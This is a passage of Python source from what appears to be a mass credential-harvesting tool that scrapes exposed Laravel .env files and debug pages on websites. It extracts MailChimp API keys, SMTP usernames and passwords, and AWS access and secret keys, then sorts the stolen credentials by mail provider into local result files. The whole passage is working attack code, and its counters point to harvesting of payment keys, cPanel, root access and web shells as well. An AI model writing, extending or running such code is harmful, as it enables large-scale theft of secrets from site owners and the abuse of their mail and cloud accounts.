	global TOTAL_DB, TOTAL_DO_SPACES, TOTAL_RT_PLAID, TOTAL_PUSHER, TOTAL_SSLCZ_STORE, TOTAL_PAYSTACK, TOTAL_INSTAMOJO, TOTAL_PAYTM, TOTAL_STRIPE, TOTAL_NEXMO, TOTAL_TWILIO, TOTAL_MAILCHIMP, TOTAL_SMTP, TOTAL_AWS_KEY, TOTAL_CP, TOTAL_ROOT, TOTAL_RS
	MAILCHIMP_API_KEY = ""; MAILCHIMP_LIST_ID = "";
	# ////////////////////////////////////////////////////////////////
	if METHOD_ == "[/.ENV]":
		if "MAILCHIMP_API_KEY =" in SRC_ and "MAILCHIMP_LIST_ID =" in SRC_:
			if "MAILCHIMP_API_KEY" in SRC_: MAILCHIMP_API_KEY = SRC_.split("MAILCHIMP_API_KEY = ")[1].split("\n")[0]
			if "MAILCHIMP_LIST_ID" in SRC_: MAILCHIMP_LIST_ID = SRC_.split("MAILCHIMP_LIST_ID = ")[1].split("\n")[0]
			TEMP = "URL: {}\nMETHOD: {}\nMAILCHIMP_API_KEY: {}\nMAILCHIMP_LIST_ID: {}\n===================================\n\n".format(URL_, METHOD_, MAILCHIMP_API_KEY, MAILCHIMP_LIST_ID)
			MAILCHIMP = open("Rzlts/MAILCHIMP.txt", "a+")
			MAILCHIMP.write(TEMP)
			MAILCHIMP.close()
			TOTAL_MAILCHIMP+=1
			os.system("title "+ "DB: {}, DOSpace: {}, RtPlaid: {}, Pusher: {}, SSLCZ: {}, PayStack: {}, InstaMojo: {}, PayTM: {}, Stripe: {}, Nexmo: {}, Twilio: {}, MailChimp: {}, SMTP: {}, AWS_KEY: {}, Cpanel: {}, Root: {}, Reseller: {}, Shells: {}".format(TOTAL_DB, TOTAL_DO_SPACES, TOTAL_RT_PLAID, TOTAL_PUSHER, TOTAL_SSLCZ_STORE, TOTAL_PAYSTACK, TOTAL_INSTAMOJO, TOTAL_PAYTM, TOTAL_STRIPE, TOTAL_NEXMO, TOTAL_TWILIO, TOTAL_MAILCHIMP, TOTAL_SMTP, TOTAL_AWS_KEY, TOTAL_CP, TOTAL_ROOT, TOTAL_RS, TOTAL_SHELLS))
		else:
			pass
	elif METHOD_ == "[DEBUG]":
		if "<td>MAILCHIMP_API_KEY</td>" in SRC_ and "<td>MAILCHIMP_LIST_ID</td>" in SRC_:
			try:
				if "MAILCHIMP_API_KEY" in SRC_: MAILCHIMP_API_KEY = reg('<td>MAILCHIMP_API_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', SRC_)[0]
			except: pass
			try:
				if "MAILCHIMP_LIST_ID" in SRC_: MAILCHIMP_LIST_ID = reg('<td>MAILCHIMP_LIST_ID<\/td>\s+<td><pre.*>(.*?)<\/span>', SRC_)[0]
			except: pass
			TEMP = "URL: {}\nMETHOD: {}\nMAILCHIMP_API_KEY: {}\nMAILCHIMP_LIST_ID: {}\n===================================\n\n".format(URL_, METHOD_, MAILCHIMP_API_KEY, MAILCHIMP_LIST_ID)
			MAILCHIMP = open("Rzlts/MAILCHIMP.txt", "a+")
			MAILCHIMP.write(TEMP)
			MAILCHIMP.close()
			TOTAL_MAILCHIMP+=1
			os.system("title "+ "DB: {}, DOSpace: {}, RtPlaid: {}, Pusher: {}, SSLCZ: {}, PayStack: {}, InstaMojo: {}, PayTM: {}, Stripe: {}, Nexmo: {}, Twilio: {}, MailChimp: {}, SMTP: {}, AWS_KEY: {}, Cpanel: {}, Root: {}, Reseller: {}, Shells: {}".format(TOTAL_DB, TOTAL_DO_SPACES, TOTAL_RT_PLAID, TOTAL_PUSHER, TOTAL_SSLCZ_STORE, TOTAL_PAYSTACK, TOTAL_INSTAMOJO, TOTAL_PAYTM, TOTAL_STRIPE, TOTAL_NEXMO, TOTAL_TWILIO, TOTAL_MAILCHIMP, TOTAL_SMTP, TOTAL_AWS_KEY, TOTAL_CP, TOTAL_ROOT, TOTAL_RS, TOTAL_SHELLS))
		else:
			pass
	else:
		pass
	# ////////////////////////////////////////////////////////////////
	# ////////////////////////////////////////////////////////////////


def GET_SMTP(SRC_, URL_, METHOD_):
	global TOTAL_DB, TOTAL_DO_SPACES, TOTAL_RT_PLAID, TOTAL_PUSHER, TOTAL_SSLCZ_STORE, TOTAL_PAYSTACK, TOTAL_INSTAMOJO, TOTAL_PAYTM, TOTAL_STRIPE, TOTAL_NEXMO, TOTAL_TWILIO, TOTAL_MAILCHIMP, TOTAL_SMTP, TOTAL_AWS_KEY, TOTAL_CP, TOTAL_ROOT, TOTAL_RS
	MAIL_HOST = ""; MAIL_PORT = ""; MAIL_DRIVER = ""; MAIL_USERNAME = ""; MAIL_PASSWORD = ""; MAIL_FROM_ADDRESS = ""; SMTP_FROM_EMAIL = ""; MAIL_FROM_NAME = ""; MAIL_ENCRYPTION = "";
	if METHOD_ == "[/.ENV]":
		if "MAIL_HOST=" in SRC_ and "MAIL_PORT=" in SRC_:
			if "MAIL_HOST" in SRC_: MAIL_HOST = SRC_.split("MAIL_HOST=")[1].split("\n")[0]
			if "MAIL_PORT" in SRC_: MAIL_PORT = SRC_.split("MAIL_PORT=")[1].split("\n")[0]
			if "MAIL_DRIVER" in SRC_: MAIL_DRIVER = SRC_.split("MAIL_DRIVER=")[1].split("\n")[0]
			if "MAIL_USERNAME" in SRC_: MAIL_USERNAME = SRC_.split("MAIL_USERNAME=")[1].split("\n")[0]
			if "MAIL_PASSWORD" in SRC_: MAIL_PASSWORD = SRC_.split("MAIL_PASSWORD=")[1].split("\n")[0]
			if "MAIL_FROM_ADDRESS=" in SRC_: MAIL_FROM_ADDRESS = SRC_.split("MAIL_FROM_ADDRESS=")[1].split("\n")[0]
			if "MAIL_FROM_ADDRESS =" in SRC_: MAIL_FROM_ADDRESS = SRC_.split("MAIL_FROM_ADDRESS =")[1].split("\n")[0]
			if "SMTP_FROM_EMAIL=" in SRC_: SMTP_FROM_EMAIL = SRC_.split("SMTP_FROM_EMAIL=")[1].split("\n")[0]
			if "SMTP_FROM_EMAIL =" in SRC_: SMTP_FROM_EMAIL = SRC_.split("SMTP_FROM_EMAIL =")[1].split("\n")[0]
			if "MAIL_FROM_NAME=" in SRC_: MAIL_FROM_NAME = SRC_.split("MAIL_FROM_NAME=")[1].split("\n")[0]
			if "MAIL_FROM_NAME =" in SRC_: MAIL_FROM_NAME = SRC_.split("MAIL_FROM_NAME =")[1].split("\n")[0]
			if "MAIL_ENCRYPTION" in SRC_: MAIL_ENCRYPTION = SRC_.split("MAIL_ENCRYPTION=")[1].split("\n")[0]
			TEMP = "URL: {}\nMETHOD: {}\nMAIL_DRIVER: {}\nMAIL_HOST: {}\nMAIL_PORT: {}\nMAIL_USERNAME: {}\nMAIL_PASSWORD: {}\nSMTP_FROM_EMAIL: {}\nMAIL_FROM_ADDRESS: {}\nMAIL_FROM_NAME: {}\nMAIL_ENCRYPTION: {}\n===================================\n\n".format(URL_, METHOD_, MAIL_DRIVER, MAIL_HOST, MAIL_PORT, MAIL_USERNAME, MAIL_PASSWORD, MAIL_FROM_ADDRESS, SMTP_FROM_EMAIL, MAIL_FROM_NAME, MAIL_ENCRYPTION)
		else:
			pass
	elif METHOD_ == "[DEBUG]":
		if "<td>MAIL_HOST</td>" in SRC_ and "<td>MAIL_PORT</td>" in SRC_:
			try:
				if "MAIL_HOST" in SRC_: MAIL_HOST = reg('<td>MAIL_HOST<\/td>\s+<td><pre.*>(.*?)<\/span>', SRC_)[0]
			except: pass
			try:
				if "MAIL_PORT" in SRC_: MAIL_PORT = reg('<td>MAIL_PORT<\/td>\s+<td><pre.*>(.*?)<\/span>', SRC_)[0]
			except: pass
			try:
				if "MAIL_DRIVER" in SRC_: MAIL_DRIVER = reg('<td>MAIL_DRIVER<\/td>\s+<td><pre.*>(.*?)<\/span>', SRC_)[0]
			except: pass
			try:
				if "MAIL_USERNAME" in SRC_: MAIL_USERNAME = reg('<td>MAIL_USERNAME<\/td>\s+<td><pre.*>(.*?)<\/span>', SRC_)[0]
			except: pass
			try:
				if "MAIL_PASSWORD" in SRC_: MAIL_PASSWORD = reg('<td>MAIL_PASSWORD<\/td>\s+<td><pre.*>(.*?)<\/span>', SRC_)[0]
			except: pass
			try:
				if "MAIL_FROM_ADDRESS" in SRC_: MAIL_FROM_ADDRESS = reg('<td>MAIL_FROM_ADDRESS<\/td>\s+<td><pre.*>(.*?)<\/span>', SRC_)[0]
			except: pass
			try:
				if "SMTP_FROM_EMAIL" in SRC_: SMTP_FROM_EMAIL = reg('<td>SMTP_FROM_EMAIL<\/td>\s+<td><pre.*>(.*?)<\/span>', SRC_)[0]
			except: pass
			try:
				if "MAIL_FROM_NAME" in SRC_: MAIL_FROM_NAME = reg('<td>MAIL_FROM_NAME<\/td>\s+<td><pre.*>(.*?)<\/span>', SRC_)[0]
			except: pass
			try:
				if "MAIL_ENCRYPTION" in SRC_: MAIL_ENCRYPTION = reg('<td>MAIL_ENCRYPTION<\/td>\s+<td><pre.*>(.*?)<\/span>', SRC_)[0]
			except: pass
			TEMP = "URL: {}\nMETHOD: {}\nMAIL_DRIVER: {}\nMAIL_HOST: {}\nMAIL_PORT: {}\nMAIL_USERNAME: {}\nMAIL_PASSWORD: {}\nSMTP_FROM_EMAIL: {}\nMAIL_FROM_ADDRESS: {}\nMAIL_FROM_NAME: {}\nMAIL_ENCRYPTION: {}\n===================================\n\n".format(URL_, METHOD_, MAIL_DRIVER, MAIL_HOST, MAIL_PORT, MAIL_USERNAME, MAIL_PASSWORD, MAIL_FROM_ADDRESS, SMTP_FROM_EMAIL, MAIL_FROM_NAME, MAIL_ENCRYPTION)
		else:
			pass
	else:
		#TEMP = "URL: {}\nMETHOD: {}\nMAIL_DRIVER: {}\nMAIL_HOST: {}\nMAIL_PORT: {}\nMAIL_USERNAME: {}\nMAIL_PASSWORD: {}\nSMTP_FROM_EMAIL: {}\nMAIL_FROM_ADDRESS: {}\nMAIL_FROM_NAME: {}\nMAIL_ENCRYPTION: {}\n===================================\n\n".format(URL_, METHOD_, MAIL_HOST, MAIL_PORT, MAIL_DRIVER, MAIL_USERNAME, MAIL_PASSWORD, MAIL_FROM_ADDRESS, SMTP_FROM_EMAIL, MAIL_FROM_NAME, MAIL_ENCRYPTION)
		pass
	# ////////////////////////////////////////////////////////////////////////////////////////////////////////
	if MAIL_HOST == "" or MAIL_USERNAME == "" or MAIL_PASSWORD == "":
		pass
	else:
		if "***" in MAIL_HOST or "***" in MAIL_USERNAME or "***" in MAIL_PORT or "****" in MAIL_PASSWORD or "null" in MAIL_HOST or "null" in MAIL_USERNAME or "null" in MAIL_PORT or "mt1" in MAIL_HOST or "mt1" in MAIL_USERNAME or "mt1" in MAIL_PORT or "mt1" in MAIL_PASSWORD:
			pass
		elif "sendgrid" in MAIL_HOST:
			SendGrid = open("Rzlts/SMTPS/SendGrid.txt", "a+")
			SendGrid.write(TEMP)
			SendGrid.close()
			TOTAL_SMTP+=1
			os.system("title "+ "DB: {}, DOSpace: {}, RtPlaid: {}, Pusher: {}, SSLCZ: {}, PayStack: {}, InstaMojo: {}, PayTM: {}, Stripe: {}, Nexmo: {}, Twilio: {}, MailChimp: {}, SMTP: {}, AWS_KEY: {}, Cpanel: {}, Root: {}, Reseller: {}, Shells: {}".format(TOTAL_DB, TOTAL_DO_SPACES, TOTAL_RT_PLAID, TOTAL_PUSHER, TOTAL_SSLCZ_STORE, TOTAL_PAYSTACK, TOTAL_INSTAMOJO, TOTAL_PAYTM, TOTAL_STRIPE, TOTAL_NEXMO, TOTAL_TWILIO, TOTAL_MAILCHIMP, TOTAL_SMTP, TOTAL_AWS_KEY, TOTAL_CP, TOTAL_ROOT, TOTAL_RS, TOTAL_SHELLS))
		elif "amazonaws" in MAIL_HOST:
			AmazonAWS = open("Rzlts/SMTPS/AmazonAWS.txt", "a+")
			AmazonAWS.write(TEMP)
			AmazonAWS.close()
			TOTAL_SMTP+=1
			os.system("title "+ "DB: {}, DOSpace: {}, RtPlaid: {}, Pusher: {}, SSLCZ: {}, PayStack: {}, InstaMojo: {}, PayTM: {}, Stripe: {}, Nexmo: {}, Twilio: {}, MailChimp: {}, SMTP: {}, AWS_KEY: {}, Cpanel: {}, Root: {}, Reseller: {}, Shells: {}".format(TOTAL_DB, TOTAL_DO_SPACES, TOTAL_RT_PLAID, TOTAL_PUSHER, TOTAL_SSLCZ_STORE, TOTAL_PAYSTACK, TOTAL_INSTAMOJO, TOTAL_PAYTM, TOTAL_STRIPE, TOTAL_NEXMO, TOTAL_TWILIO, TOTAL_MAILCHIMP, TOTAL_SMTP, TOTAL_AWS_KEY, TOTAL_CP, TOTAL_ROOT, TOTAL_RS, TOTAL_SHELLS))
		elif "gmail." in MAIL_HOST or "googlemail." in MAIL_HOST:
			Gmail = open("Rzlts/SMTPS/Gmail.txt", "a+")
			Gmail.write(TEMP)
			Gmail.close()
			TOTAL_SMTP+=1
			os.system("title "+ "DB: {}, DOSpace: {}, RtPlaid: {}, Pusher: {}, SSLCZ: {}, PayStack: {}, InstaMojo: {}, PayTM: {}, Stripe: {}, Nexmo: {}, Twilio: {}, MailChimp: {}, SMTP: {}, AWS_KEY: {}, Cpanel: {}, Root: {}, Reseller: {}, Shells: {}".format(TOTAL_DB, TOTAL_DO_SPACES, TOTAL_RT_PLAID, TOTAL_PUSHER, TOTAL_SSLCZ_STORE, TOTAL_PAYSTACK, TOTAL_INSTAMOJO, TOTAL_PAYTM, TOTAL_STRIPE, TOTAL_NEXMO, TOTAL_TWILIO, TOTAL_MAILCHIMP, TOTAL_SMTP, TOTAL_AWS_KEY, TOTAL_CP, TOTAL_ROOT, TOTAL_RS, TOTAL_SHELLS))
		elif "mailtrap" in MAIL_HOST:
			MailTrap = open("Rzlts/SMTPS/MailTrap.txt", "a+")
			MailTrap.write(TEMP)
			MailTrap.close()
			TOTAL_SMTP+=1
			os.system("title "+ "DB: {}, DOSpace: {}, RtPlaid: {}, Pusher: {}, SSLCZ: {}, PayStack: {}, InstaMojo: {}, PayTM: {}, Stripe: {}, Nexmo: {}, Twilio: {}, MailChimp: {}, SMTP: {}, AWS_KEY: {}, Cpanel: {}, Root: {}, Reseller: {}, Shells: {}".format(TOTAL_DB, TOTAL_DO_SPACES, TOTAL_RT_PLAID, TOTAL_PUSHER, TOTAL_SSLCZ_STORE, TOTAL_PAYSTACK, TOTAL_INSTAMOJO, TOTAL_PAYTM, TOTAL_STRIPE, TOTAL_NEXMO, TOTAL_TWILIO, TOTAL_MAILCHIMP, TOTAL_SMTP, TOTAL_AWS_KEY, TOTAL_CP, TOTAL_ROOT, TOTAL_RS, TOTAL_SHELLS))
		elif "mailgun" in MAIL_HOST:
			Mailgun = open("Rzlts/SMTPS/Mailgun.txt", "a+")
			Mailgun.write(TEMP)
			Mailgun.close()
			TOTAL_SMTP+=1
			os.system("title "+ "DB: {}, DOSpace: {}, RtPlaid: {}, Pusher: {}, SSLCZ: {}, PayStack: {}, InstaMojo: {}, PayTM: {}, Stripe: {}, Nexmo: {}, Twilio: {}, MailChimp: {}, SMTP: {}, AWS_KEY: {}, Cpanel: {}, Root: {}, Reseller: {}, Shells: {}".format(TOTAL_DB, TOTAL_DO_SPACES, TOTAL_RT_PLAID, TOTAL_PUSHER, TOTAL_SSLCZ_STORE, TOTAL_PAYSTACK, TOTAL_INSTAMOJO, TOTAL_PAYTM, TOTAL_STRIPE, TOTAL_NEXMO, TOTAL_TWILIO, TOTAL_MAILCHIMP, TOTAL_SMTP, TOTAL_AWS_KEY, TOTAL_CP, TOTAL_ROOT, TOTAL_RS, TOTAL_SHELLS))
		elif "office365" in MAIL_HOST or "outlook" in MAIL_HOST:
			Office365 = open("Rzlts/SMTPS/Office365.txt", "a+")
			Office365.write(TEMP)
			Office365.close()
			TOTAL_SMTP+=1
			os.system("title "+ "DB: {}, DOSpace: {}, RtPlaid: {}, Pusher: {}, SSLCZ: {}, PayStack: {}, InstaMojo: {}, PayTM: {}, Stripe: {}, Nexmo: {}, Twilio: {}, MailChimp: {}, SMTP: {}, AWS_KEY: {}, Cpanel: {}, Root: {}, Reseller: {}, Shells: {}".format(TOTAL_DB, TOTAL_DO_SPACES, TOTAL_RT_PLAID, TOTAL_PUSHER, TOTAL_SSLCZ_STORE, TOTAL_PAYSTACK, TOTAL_INSTAMOJO, TOTAL_PAYTM, TOTAL_STRIPE, TOTAL_NEXMO, TOTAL_TWILIO, TOTAL_MAILCHIMP, TOTAL_SMTP, TOTAL_AWS_KEY, TOTAL_CP, TOTAL_ROOT, TOTAL_RS, TOTAL_SHELLS))
		elif "postmarkapp" in MAIL_HOST:
			PostMarkAPP = open("Rzlts/SMTPS/PostMarkAPP.txt", "a+")
			PostMarkAPP.write(TEMP)
			PostMarkAPP.close()
			TOTAL_SMTP+=1
			os.system("title "+ "DB: {}, DOSpace: {}, RtPlaid: {}, Pusher: {}, SSLCZ: {}, PayStack: {}, InstaMojo: {}, PayTM: {}, Stripe: {}, Nexmo: {}, Twilio: {}, MailChimp: {}, SMTP: {}, AWS_KEY: {}, Cpanel: {}, Root: {}, Reseller: {}, Shells: {}".format(TOTAL_DB, TOTAL_DO_SPACES, TOTAL_RT_PLAID, TOTAL_PUSHER, TOTAL_SSLCZ_STORE, TOTAL_PAYSTACK, TOTAL_INSTAMOJO, TOTAL_PAYTM, TOTAL_STRIPE, TOTAL_NEXMO, TOTAL_TWILIO, TOTAL_MAILCHIMP, TOTAL_SMTP, TOTAL_AWS_KEY, TOTAL_CP, TOTAL_ROOT, TOTAL_RS, TOTAL_SHELLS))
		elif "sparkpostmail" in MAIL_HOST:
			SparkPostMail = open("Rzlts/SMTPS/SparkPostMail.txt", "a+")
			SparkPostMail.write(TEMP)
			SparkPostMail.close()
			TOTAL_SMTP+=1
			os.system("title "+ "DB: {}, DOSpace: {}, RtPlaid: {}, Pusher: {}, SSLCZ: {}, PayStack: {}, InstaMojo: {}, PayTM: {}, Stripe: {}, Nexmo: {}, Twilio: {}, MailChimp: {}, SMTP: {}, AWS_KEY: {}, Cpanel: {}, Root: {}, Reseller: {}, Shells: {}".format(TOTAL_DB, TOTAL_DO_SPACES, TOTAL_RT_PLAID, TOTAL_PUSHER, TOTAL_SSLCZ_STORE, TOTAL_PAYSTACK, TOTAL_INSTAMOJO, TOTAL_PAYTM, TOTAL_STRIPE, TOTAL_NEXMO, TOTAL_TWILIO, TOTAL_MAILCHIMP, TOTAL_SMTP, TOTAL_AWS_KEY, TOTAL_CP, TOTAL_ROOT, TOTAL_RS, TOTAL_SHELLS))
		elif ".zoho." in MAIL_HOST:
			Zoho = open("Rzlts/SMTPS/Zoho.txt", "a+")
			Zoho.write(TEMP)
			Zoho.close()
			TOTAL_SMTP+=1
			os.system("title "+ "DB: {}, DOSpace: {}, RtPlaid: {}, Pusher: {}, SSLCZ: {}, PayStack: {}, InstaMojo: {}, PayTM: {}, Stripe: {}, Nexmo: {}, Twilio: {}, MailChimp: {}, SMTP: {}, AWS_KEY: {}, Cpanel: {}, Root: {}, Reseller: {}, Shells: {}".format(TOTAL_DB, TOTAL_DO_SPACES, TOTAL_RT_PLAID, TOTAL_PUSHER, TOTAL_SSLCZ_STORE, TOTAL_PAYSTACK, TOTAL_INSTAMOJO, TOTAL_PAYTM, TOTAL_STRIPE, TOTAL_NEXMO, TOTAL_TWILIO, TOTAL_MAILCHIMP, TOTAL_SMTP, TOTAL_AWS_KEY, TOTAL_CP, TOTAL_ROOT, TOTAL_RS, TOTAL_SHELLS))
		elif "bluehost" in MAIL_HOST:
			Bluehost = open("Rzlts/SMTPS/Bluehost.txt", "a+")
			Bluehost.write(TEMP)
			Bluehost.close()
			TOTAL_SMTP+=1
			os.system("title "+ "DB: {}, DOSpace: {}, RtPlaid: {}, Pusher: {}, SSLCZ: {}, PayStack: {}, InstaMojo: {}, PayTM: {}, Stripe: {}, Nexmo: {}, Twilio: {}, MailChimp: {}, SMTP: {}, AWS_KEY: {}, Cpanel: {}, Root: {}, Reseller: {}, Shells: {}".format(TOTAL_DB, TOTAL_DO_SPACES, TOTAL_RT_PLAID, TOTAL_PUSHER, TOTAL_SSLCZ_STORE, TOTAL_PAYSTACK, TOTAL_INSTAMOJO, TOTAL_PAYTM, TOTAL_STRIPE, TOTAL_NEXMO, TOTAL_TWILIO, TOTAL_MAILCHIMP, TOTAL_SMTP, TOTAL_AWS_KEY, TOTAL_CP, TOTAL_ROOT, TOTAL_RS, TOTAL_SHELLS))
		elif "ionos" in MAIL_HOST or "1and1" in MAIL_HOST:
			IONOS = open("Rzlts/SMTPS/Ionos.txt", "a+")
			IONOS.write(TEMP)
			IONOS.close()
			TOTAL_SMTP+=1
			os.system("title "+ "DB: {}, DOSpace: {}, RtPlaid: {}, Pusher: {}, SSLCZ: {}, PayStack: {}, InstaMojo: {}, PayTM: {}, Stripe: {}, Nexmo: {}, Twilio: {}, MailChimp: {}, SMTP: {}, AWS_KEY: {}, Cpanel: {}, Root: {}, Reseller: {}, Shells: {}".format(TOTAL_DB, TOTAL_DO_SPACES, TOTAL_RT_PLAID, TOTAL_PUSHER, TOTAL_SSLCZ_STORE, TOTAL_PAYSTACK, TOTAL_INSTAMOJO, TOTAL_PAYTM, TOTAL_STRIPE, TOTAL_NEXMO, TOTAL_TWILIO, TOTAL_MAILCHIMP, TOTAL_SMTP, TOTAL_AWS_KEY, TOTAL_CP, TOTAL_ROOT, TOTAL_RS, TOTAL_SHELLS))
		else:
			SMTPS = open("Rzlts/SMTPS/SMTPS.txt", "a+")
			SMTPS.write(TEMP)
			SMTPS.close()
			TOTAL_SMTP+=1
			os.system("title "+ "DB: {}, DOSpace: {}, RtPlaid: {}, Pusher: {}, SSLCZ: {}, PayStack: {}, InstaMojo: {}, PayTM: {}, Stripe: {}, Nexmo: {}, Twilio: {}, MailChimp: {}, SMTP: {}, AWS_KEY: {}, Cpanel: {}, Root: {}, Reseller: {}, Shells: {}".format(TOTAL_DB, TOTAL_DO_SPACES, TOTAL_RT_PLAID, TOTAL_PUSHER, TOTAL_SSLCZ_STORE, TOTAL_PAYSTACK, TOTAL_INSTAMOJO, TOTAL_PAYTM, TOTAL_STRIPE, TOTAL_NEXMO, TOTAL_TWILIO, TOTAL_MAILCHIMP, TOTAL_SMTP, TOTAL_AWS_KEY, TOTAL_CP, TOTAL_ROOT, TOTAL_RS, TOTAL_SHELLS))
	# ////////////////////////////////////////////////////////////////
	# ////////////////////////////////////////////////////////////////


def GET_AWS_KEY(SRC_, URL_, METHOD_):
	global TOTAL_DB, TOTAL_DO_SPACES, TOTAL_RT_PLAID, TOTAL_PUSHER, TOTAL_SSLCZ_STORE, TOTAL_PAYSTACK, TOTAL_INSTAMOJO, TOTAL_PAYTM, TOTAL_STRIPE, TOTAL_NEXMO, TOTAL_TWILIO, TOTAL_MAILCHIMP, TOTAL_SMTP, TOTAL_AWS_KEY, TOTAL_CP, TOTAL_ROOT, TOTAL_RS
	AWS_ACCESS_KEY_ID = ""; AWS_SECRET_ACCESS_KEY = ""; AWS_DEFAULT_REGION = ""; AWS_BUCKET = ""; SES_KEY = ""; SES_SECRET = ""; SES_REGION = "";
	TEMP = "URL: {}\nMETHOD: {}\nAWS_ACCESS_KEY_ID: {}|AWS_SECRET_ACCESS_KEY: {}|AWS_DEFAULT_REGION: {}\nAWS_BUCKET: {}\nSES_KEY: {}|SES_SECRET: {}|SES_REGION: {}\n===================================\n\n".format(URL_, METHOD_, AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, AWS_DEFAULT_REGION, AWS_BUCKET, SES_KEY, SES_SECRET, SES_REGION)
	# ////////////////////////////////////////////////////////////////
	if METHOD_ == "[/.ENV]":
		if "AWS_ACCESS_KEY_ID" in SRC_ or "AWS_SECRET_ACCESS_KEY" in SRC_ or "SES_KEY" in SRC_:
			if "AWS_DEFAULT_REGION=" in SRC_: AWS_DEFAULT_REGION = SRC_.split("AWS_DEFAULT_REGION=")[1].split("\n")[0]
			if "AWS_DEFAULT_REGION =" in SRC_: AWS_DEFAULT_REGION = SRC_.split("AWS_DEFAULT_REGION =")[1].split("\n")[0]
			if "AWS_BUCKET=" in SRC_: AWS_BUCKET = SRC_.split("AWS_BUCKET=")[1].split("\n")[0]
			if "AWS_BUCKET =" in SRC_: AWS_BUCKET = SRC_.split("AWS_BUCKET =")[1].split("\n")[0]
			if "AWS_ACCESS_KEY_ID=" in SRC_: AWS_ACCESS_KEY_ID = SRC_.split("AWS_ACCESS_KEY_ID=")[1].split("\n")[0]
			if "AWS_ACCESS_KEY_ID =" in SRC_: AWS_ACCESS_KEY_ID = SRC_.split("AWS_ACCESS_KEY_ID =")[1].split("\n")[0]
			if "AWS_SECRET_ACCESS_KEY=" in SRC_: AWS_SECRET_ACCESS_KEY = SRC_.split("AWS_SECRET_ACCESS_KEY=")[1].split("\n")[0]
			if "AWS_SECRET_ACCESS_KEY =" in SRC_: AWS_SECRET_ACCESS_KEY = SRC_.split("AWS_SECRET_ACCESS_KEY =")[1].split("\n")[0]
			TEMP = "URL: {}\nMETHOD: {}\nAWS_ACCESS_KEY_ID: {}|AWS_SECRET_ACCESS_KEY: {}|AWS_DEFAULT_REGION: {}\nAWS_BUCKET: {}\n===================================\n\n".format(URL_, METHOD_, AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, AWS_DEFAULT_REGION, AWS_BUCKET)
			if "SES_KEY" in SRC_ or "SES_SECRET" in SRC_:
				if "SES_KEY=" in SRC_: SES_KEY = SRC_.split("SES_KEY=")[1].split("\n")[0]
				if "SES_KEY =" in SRC_: SES_KEY = SRC_.split("SES_KEY =")[1].split("\n")[0]
				if "SES_SECRET=" in SRC_: SES_SECRET = SRC_.split("SES_SECRET=")[1].split("\n")[0]
				if "SES_SECRET =" in SRC_: SES_SECRET = SRC_.split("SES_SECRET =")[1].split("\n")[0]
				if "SES_REGION=" in SRC_: SES_REGION = SRC_.split("SES_REGION=")[1].split("\n")[0]
				if "SES_REGION =" in SRC_: SES_REGION = SRC_.split("SES_REGION =")[1].split("\n")[0]
				TEMP = "URL: {}\nMETHOD: {}\nAWS_ACCESS_KEY_ID: {}|AWS_SECRET_ACCESS_KEY: {}|AWS_DEFAULT_REGION: {}\nAWS_BUCKET: {}\nSES_KEY: {}|SES_SECRET: {}|SES_REGION: {}\n===================================\n\n".format(URL_, METHOD_, SES_REGION, AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, AWS_DEFAULT_REGION, AWS_BUCKET, SES_KEY, SES_SECRET, SES_REGION)
			else:
				pass
		else:
			pass
	elif METHOD_ == "[DEBUG]":
		if "<td>AWS_ACCESS_KEY_ID</td>" in SRC_ and "<td>AWS_SECRET_ACCESS_KEY</td>" in SRC_ or "<td>SES_KEY</td>" in SRC_:
			try:
				if "AWS_DEFAULT_REGION" in SRC_: AWS_DEFAULT_REGION = reg('<td>AWS_DEFAULT_REGION<\/td>\s+<td><pre.*>(.*?)<\/span>', SRC_)[0]
			except: pass
			try:
				if "AWS_BUCKET" in SRC_: AWS_BUCKET = reg('<td>AWS_BUCKET<\/td>\s+<td><pre.*>(.*?)<\/span>', SRC_)[0]
			except: pass
			try:
				if "AWS_ACCESS_KEY_ID" in SRC_: AWS_ACCESS_KEY_ID = reg('<td>AWS_ACCESS_KEY_ID<\/td>\s+<td><pre.*>(.*?)<\/span>', SRC_)[0]
			except: pass
			try:
				if "AWS_SECRET_ACCESS_KEY" in SRC_: AWS_SECRET_ACCESS_KEY = reg('<td>AWS_SECRET_ACCESS_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', SRC_)[0]
			except: pass
			TEMP = "URL: {}\nMETHOD: {}\nAWS_ACCESS_KEY_ID: {}|AWS_SECRET_ACCESS_KEY: {}|AWS_DEFAULT_REGION: {}\nAWS_BUCKET: {}\n===================================\n\n".format(URL_, METHOD_, AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, AWS_DEFAULT_REGION, AWS_BUCKET)
			if "<td>SES_KEY</td>" in SRC_:
				try:
					if "SES_KEY" in SRC_: SES_KEY = reg('<td>SES_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', SRC_)[0]
				except: pass
				try:
					if "SES_SECRET" in SRC_: SES_SECRET = reg('<td>SES_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>', SRC_)[0]
				except: pass
				try:
					if "SES_REGION" in SRC_: SES_REGION = reg('<td>SES_REGION<\/td>\s+<td><pre.*>(.*?)<\/span>', SRC_)[0]
				except: pass
				TEMP = "URL: {}\nMETHOD: {}\nAWS_ACCESS_KEY_ID: {}|AWS_SECRET_ACCESS_KEY: {}|AWS_DEFAULT_REGION: {}\nAWS_BUCKET: {}\nSES_KEY: {}|SES_SECRET: {}|SES_REGION: {}\n===================================\n\n".format(URL_, METHOD_, AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, AWS_DEFAULT_REGION, AWS_BUCKET, SES_KEY, SES_SECRET, SES_REGION)
			else:
				pass
	else:
		pass
	if len(AWS_ACCESS_KEY_ID) < 10 or len(AWS_SECRET_ACCESS_KEY) < 10:
		pass
	else:
		if "****" in AWS_ACCESS_KEY_ID or "****" in AWS_SECRET_ACCESS_KEY:
			pass
		else:
			AWS_KEY = open("Rzlts/AWS_KEY.txt", "a+")
			AWS_KEY.write(TEMP)
			AWS_KEY.close()
			TOTAL_AWS_KEY+=1
